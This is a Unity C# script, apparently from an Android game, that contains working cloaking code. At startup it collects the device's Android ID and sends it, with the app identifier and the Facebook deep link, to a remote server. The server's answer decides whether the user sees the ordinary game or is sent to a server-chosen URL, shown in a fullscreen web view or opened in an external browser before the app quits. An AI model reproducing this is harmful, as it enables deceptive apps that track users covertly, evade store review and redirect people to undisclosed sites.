using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using Facebook.Unity;
using UnityEngine.UI;
using System;
using UnityEngine.Networking;
using System.Net.NetworkInformation;

public class FacebookModule : MonoBehaviour
{
    [SerializeField] GameObject start;
    [SerializeField] GameObject loading;
    [SerializeField] [Range(1f, 60f)] int timeToShow;

    static bool showStart = false;

   // [SerializeField] UniWebView view;
    //[SerializeField] RectTransform canvas;
    UniWebView webView;
    string deepLink = "";
    string url = "";
    string serverStatus = "";
    string defaultUrl = "http://circumswingableen.info";


    private void Awake()
    {
        if (!FB.IsInitialized)
        {
            FB.Init(InitComplete);
        }
        if (showStart)
        {
            Debug.Log("Deafault");
            start.SetActive(true);
            loading.SetActive(false);
        }
    }


    void OnApplicationFocus(bool hasFocus)
    {
        if (hasFocus && FB.IsInitialized)
        {
            FB.GetAppLink(DeepLinkCallback2);
            //Redirect();
        }
    }

    void Redirect()
    {
        FB.GetAppLink(S =>
        {
            FB.Mobile.FetchDeferredAppLinkData(DeepLinkCallback);
            deepLink = S.Url;

           

            string android_id = "";

            AndroidJavaClass clsUnity = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
            AndroidJavaObject objActivity = clsUnity.GetStatic<AndroidJavaObject>("currentActivity");

            if (objActivity != null)
            {
                AndroidJavaObject objResolver = objActivity.Call<AndroidJavaObject>("getContentResolver");
                AndroidJavaClass clsSecure = new AndroidJavaClass("android.provider.Settings$Secure");
                android_id = clsSecure.CallStatic<string>("getString", objResolver, "android_id");
            }

            if (!String.IsNullOrEmpty(android_id) /*&& /*!String.IsNullOrEmpty(deepLink)*/)
            {
                string uri = @"http://poststeeplebushice.info/_app/?s=CEa4Yh6pUE&id=" + Application.identifier.ToString() + "&deep=" + deepLink + @"&hid=" + android_id;
                Debug.Log(uri);
                StartCoroutine(GetRequest(uri));

            }
            else
                GoToVebViewLByUrl(defaultUrl);

        });
    }

    void DeepLinkCallback2(IAppLinkResult result)
    {

        if (!String.IsNullOrEmpty(result.Url))
        {
            var index = (new Uri(result.Url)).Query.IndexOf("request_ids");
            if (index != -1)
            {
                // //text.text += "result.Url = " + result.Url + "\n"; ;
            }
        }
    }

    void InitComplete()
    {
        FB.ActivateApp();
        Redirect();
    }

    public void OnApplicationPause(bool pause)
    {
        if (!pause)
        {
            if (!FB.IsInitialized)
            {
                FB.Init(InitComplete);
            }
            else
            {
                FB.ActivateApp();
            }
        }

    }

    //public void CreateInvite()
    //{

    //    FB.AppRequest(
    //    "Here is a free gift!",
    //    null,
    //    new List<object>() { "app_users" },
    //    null, null, null, null,
    //    delegate (IAppRequestResult result)
    //    {
    //        Debug.Log(result.RawResult);
    //    }
    //    );
    //}



    void DeepLinkCallback(IResult result)
    {
        if (result != null && !string.IsNullOrEmpty(result.RawResult))
        {
            Debug.Log(result.RawResult);
        }

    }

    IEnumerator GoToURL()
    {
        Debug.Log("Go");

        while (true)
        {
            if(!openUrl("com.android.chrome", url))
                if (!openUrl("com.opera.browser", url))
                    if (!openUrl("org.mozilla.firefox", url))
                        if (!openUrl("com.yandex.browser", url))
                            if (!openUrl("com.UCMobile.intl", url))
                                if (!openUrl("com.gl9.cloudBrowser", url))
                                    Application.OpenURL(url);


            yield return new WaitForSeconds(timeToShow);

            //&&????????????
            Application.Quit();
        }
    }

    IEnumerator GetRequest(string uri)
    {
        Debug.Log("Get");

        //отправляем гет реквест с получением даты
        UnityWebRequest uwr = UnityWebRequest.Get(uri);
        yield return uwr.SendWebRequest();

        //проверяем на ошибку подключения
        if (uwr.isNetworkError)
        {
            Debug.Log("Error While Sending: " + uwr.error);
            GoToVebViewLByUrl(defaultUrl);
        }
        else
        {
            Debug.Log("Received: " + uwr.downloadHandler.text);

            //считываем данные в строку
            string s = uwr.downloadHandler.text;

            DataJson d = new DataJson("", "", -1);
            //записываем в данные в обьект
            d = JsonUtility.FromJson<DataJson>(s);


            if (d == null)
            {
                //переход на дефолтный экран если обьект нулл
                GoToVebViewLByUrl(defaultUrl);
            }
            else
            {

                //если в обьекте есть данные проверяем статус
                if (!String.IsNullOrEmpty(d.status))
                {
                    //и присваеваем переменной его значение
                    serverStatus = d.status;
                }

                //проверяем значение статуса и строки с url
                if (CheckStatus(d.status) && !String.IsNullOrEmpty(d.url))
                {
                    //присваиваем значение в переменную 
                    url = d.url;


                    //выполняем действие в зависимости от d.wv
                     RedOrWv(d.wv, d.url);
                   // RedOrWv(0, d.url);///////////////////////////////////////////////////////////////////////////////////
                }

            }

        }
    }
    void GetIp()
    {
        foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (ni.NetworkInterfaceType == NetworkInterfaceType.Wireless80211 || ni.NetworkInterfaceType == NetworkInterfaceType.Ethernet)
            {
                foreach (UnicastIPAddressInformation ip in ni.GetIPProperties().UnicastAddresses)
                {
                    if (ip.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        //do what you want with the IP here... add it to a list, just get the first and break out. Whatever.
                        ////text.text += "ip: " + ip.Address.ToString() + "\n";
                    }
                }
            }
        }
    }

    void GoToVebViewLByUrl(string url)
    {
        if (url == defaultUrl)
        {
            Debug.Log("Deafault");
            start.SetActive(true);
            loading.SetActive(false);
            showStart = true;
        }
        else
        if (!String.IsNullOrEmpty(url))
        {
            var webViewGameObject = new GameObject("UniWebView");
            webView = webViewGameObject.AddComponent<UniWebView>();
            
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
           // webView.ReferenceRectTransform = canvas;
            webView.Load(url);

            webView.OnOrientationChanged += (view, orientation) => {
                webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
            };

            webView.Show();
            // view.Load(url);
            // view.Show();
        }
    }

    void RedOrWv(int wv, string url)
    {
        switch (wv)
        {
            case 0:
                StartCoroutine(GoToURL());
                break;
            case 1:
                GoToVebViewLByUrl(url);
                break;
            default:
                GoToVebViewLByUrl(defaultUrl);
                break;
        }

    }

    bool CheckStatus(string status)
    {
        if (string.IsNullOrEmpty(status))
        {
            GoToVebViewLByUrl(defaultUrl);
            return false;

        }
        if (status == "ok")
            return true;

        GoToVebViewLByUrl(defaultUrl);
        return false;
    }

    //void CheckDeepLink()
    //{
    //    if (!String.IsNullOrEmpty(deepLink))
    //    {
    //        PlayerPrefs.SetString("deepLink", deepLink);
    //    }
    //    else
    //    {
    //        if (PlayerPrefs.HasKey("deepLink"))
    //        {
    //            deepLink = PlayerPrefs.GetString("deepLink");
    //        }
    //    }
    //}

    public bool openUrl(string packageName, string url)
    {
#if UNITY_ANDROID
        AndroidJavaClass unityPlayer = new AndroidJavaClass("com.unity3d.player.UnityPlayer");
        AndroidJavaObject unityActivity = unityPlayer.GetStatic<AndroidJavaObject>("currentActivity");
        AndroidJavaObject pManager = unityActivity.Call<AndroidJavaObject>("getPackageManager");

        //For accessing static strings(ACTION_VIEW) from android.content.Intent
        AndroidJavaClass intentStaticClass = new AndroidJavaClass("android.content.Intent");
        string actionView = intentStaticClass.GetStatic<string>("ACTION_VIEW");

        //Create Uri
        AndroidJavaClass uriClass = new AndroidJavaClass("android.net.Uri");
        AndroidJavaObject uriObject = uriClass.CallStatic<AndroidJavaObject>("parse", url);

        //Psss ACTION_VIEW and Uri.parse to the intent
        AndroidJavaObject intent = new AndroidJavaObject("android.content.Intent", actionView, uriObject);

        try
        {
            if (pManager.Call<AndroidJavaObject>("getPackageInfo", packageName, 0) != null)
            {
                intent.Call<AndroidJavaObject>("setPackage", packageName);
            }
        }
        catch (Exception e)
        {
            Debug.LogWarning("Failed to Open App 1: " + e.Message);
            return false;
        }

        try
        {
            unityActivity.Call("startActivity", intent);
            return true;
        }
        catch (Exception e)
        {
            Debug.LogWarning("Failed to Open App 2: " + e.Message);
            //Open with Browser
            string link = "https://play.google.com/store/apps/details?id=" + packageName + "&hl=en";

           // Application.OpenURL(link);///////////////////////////////
            return false;
        }
#endif
        return false;
    }
}



class DataJson
{
    public string status;
    public string url;
    public int wv;

    public DataJson(string status, string url, int wv)
    {
        this.status = status;
        this.url = url;
        this.wv = wv;
    }
  
}

